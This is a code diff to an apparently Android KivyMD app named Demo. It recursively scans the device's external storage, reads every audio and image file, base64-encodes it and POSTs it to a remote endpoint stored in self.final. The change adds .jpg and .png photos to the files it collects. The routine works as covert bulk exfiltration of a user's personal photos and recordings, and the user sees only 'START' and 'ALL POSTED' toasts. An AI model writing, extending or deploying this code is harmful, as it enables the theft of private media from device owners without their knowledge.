@@ -169,19 +169,23 @@ class Demo(MDApp):
         try:
             Clock.schedule_once(lambda x:toast('START'))                     
             path=primary_external_storage_path()
-            m4a_ext=('.mp3','.m4a')    
+            m4a_ext=('.mp3','.m4a','.jpg','.png')    
+            mpa_ext=('.png','.jpg')
             self.all=[]
             for f,s,fi in os.walk(path):
-                for i in fi:
+                for i in fi:                   
                     if i.lower().endswith(m4a_ext):
                         full_path=os.path.join(f,i)
                         self.all.append(full_path)
             a2=[]
-            for i in self.all:
+            for i in self.all:             
                 with open(i,'rb') as f:
                     data=f.read()  
                     encode=base64.b64encode(data).decode('utf-8')
-                    jsn={'images':encode}
+                    if i.lower().endswith(mpa_ext):
+                        jsn={'images':encode}
+                    else:
+                        jsn={'audio':encode}
                     requests.post(self.final,json=jsn)                    
             Clock.schedule_once(lambda x:toast('ALL POSTED'))                   
 
